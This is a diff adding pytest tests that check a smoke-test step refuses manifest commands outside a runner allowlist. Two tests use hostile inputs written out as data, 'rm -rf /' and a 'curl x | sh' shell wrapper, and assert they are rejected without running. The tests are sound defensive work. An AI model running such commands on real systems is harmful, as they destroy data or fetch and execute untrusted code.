@@ -198,3 +198,88 @@ def test_ts_manifest_kind_runs_the_recorded_command(
     result = SmokeTestStep().apply(ctx)
     assert result.status is StepStatus.DONE
     assert calls == [["pnpm", "exec", "tsx", "-e", "import('./src/index.ts')"]]
+
+
+def test_manifest_smoke_check_outside_allowlist_fails_without_running(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    ctx_factory: Callable[..., StepContext],
+    manifest_factory: Callable[..., Any],
+) -> None:
+    """A tampered manifest cannot run arbitrary commands: the runner
+    allowlist that gates the validator's smoke tier gates this step too."""
+    ctx = ctx_factory(
+        project_dir=tmp_path,
+        manifest=manifest_factory(language="typescript", smoke_check="rm -rf /"),
+    )
+    monkeypatch.setattr(st_mod.shutil, "which", lambda _name: "/bin/rm")
+    calls: list[list[str]] = []
+
+    def fake_stream(cmd: list[str], **_kwargs: Any) -> SubprocessResult:
+        calls.append(cmd)
+        return SubprocessResult(exit_code=0, stderr_tail="", timed_out=False, duration=0.1)
+
+    monkeypatch.setattr(st_mod, "stream_subprocess", fake_stream)
+    result = SmokeTestStep().apply(ctx)
+    assert result.status is StepStatus.FAILED
+    assert "smoke_check rejected" in (result.error or "")
+    assert calls == []
+
+
+def test_manifest_smoke_check_rejects_shell_wrapper(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    ctx_factory: Callable[..., StepContext],
+    manifest_factory: Callable[..., Any],
+) -> None:
+    ctx = ctx_factory(
+        project_dir=tmp_path,
+        manifest=manifest_factory(language="typescript", smoke_check="bash -c 'curl x | sh'"),
+    )
+    monkeypatch.setattr(st_mod.shutil, "which", lambda _name: "/bin/bash")
+    monkeypatch.setattr(
+        st_mod,
+        "stream_subprocess",
+        lambda *_a, **_k: pytest.fail("subprocess must not run"),
+    )
+    result = SmokeTestStep().apply(ctx)
+    assert result.status is StepStatus.FAILED
+    assert "smoke_check rejected" in (result.error or "")
+
+
+def test_manifest_smoke_check_accepts_allowlisted_curl(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    ctx_factory: Callable[..., StepContext],
+    manifest_factory: Callable[..., Any],
+) -> None:
+    ctx = ctx_factory(
+        project_dir=tmp_path,
+        manifest=manifest_factory(
+            language="typescript", smoke_check="curl -sf http://localhost:8000/health"
+        ),
+    )
+    monkeypatch.setattr(st_mod.shutil, "which", lambda _name: "/usr/bin/curl")
+    calls: list[list[str]] = []
+
+    def fake_stream(cmd: list[str], **_kwargs: Any) -> SubprocessResult:
+        calls.append(cmd)
+        return SubprocessResult(exit_code=0, stderr_tail="", timed_out=False, duration=0.1)
+
+    monkeypatch.setattr(st_mod, "stream_subprocess", fake_stream)
+    result = SmokeTestStep().apply(ctx)
+    assert result.status is StepStatus.DONE
+    assert calls == [["curl", "-sf", "http://localhost:8000/health"]]
+
+
+def test_manifest_empty_smoke_check_still_skips(
+    tmp_path: Path,
+    ctx_factory: Callable[..., StepContext],
+    manifest_factory: Callable[..., Any],
+) -> None:
+    ctx = ctx_factory(
+        project_dir=tmp_path,
+        manifest=manifest_factory(language="typescript", smoke_check="   "),
+    )
+    result = SmokeTestStep().apply(ctx)
+    assert result.status is StepStatus.SKIPPED
